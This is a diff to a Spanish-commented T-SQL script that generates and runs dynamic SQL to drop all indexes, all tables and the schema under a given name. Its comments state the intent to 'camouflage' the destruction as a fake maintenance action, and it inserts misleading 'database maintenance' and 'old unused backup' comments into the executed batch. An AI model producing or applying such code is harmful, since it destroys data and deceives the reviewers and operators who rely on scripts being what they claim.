@@ -57,21 +57,30 @@ JOIN sys.tables t ON k.parent_object_id = t.object_id
 JOIN sys.schemas s ON t.schema_id = s.schema_id
 WHERE s.name = @SchemaName;
 
--- 8. DROP TABLES
+-- 8. DROP INDEXES (no clusterizados ni constraints)
+SELECT @sql += 
+    'DROP INDEX [' + i.name + '] ON [' + s.name + '].[' + t.name + '];' + CHAR(13)
+FROM sys.indexes i
+JOIN sys.tables t ON i.object_id = t.object_id
+JOIN sys.schemas s ON t.schema_id = s.schema_id
+WHERE s.name = @SchemaName
+  AND i.is_primary_key = 0
+  AND i.is_unique_constraint = 0
+  AND i.name IS NOT NULL;
+
+-- 9. DROP TABLES
 SELECT @sql += 
     'DROP TABLE [' + s.name + '].[' + t.name + '];' + CHAR(13)
 FROM sys.tables t
 JOIN sys.schemas s ON t.schema_id = s.schema_id
 WHERE s.name = @SchemaName;
 
-
--- Esto lo disimulamos con una falsa "acción de mantenimiento"
+-- 10. CAMUFLAR DROP DATABASE
 SET @sql += '-- mantenimiento de base de datos' + CHAR(13);
 SET @sql += '/* Drop antiguo backup no utilizado */' + CHAR(13);
 
--- 10. DROP SCHEMA al final
+-- 11. DROP SCHEMA al final
 SET @sql += 'DROP SCHEMA [' + @SchemaName + '];' + CHAR(13);
 
 -- Ejecutar todo
 EXEC sp_executesql @sql;
-
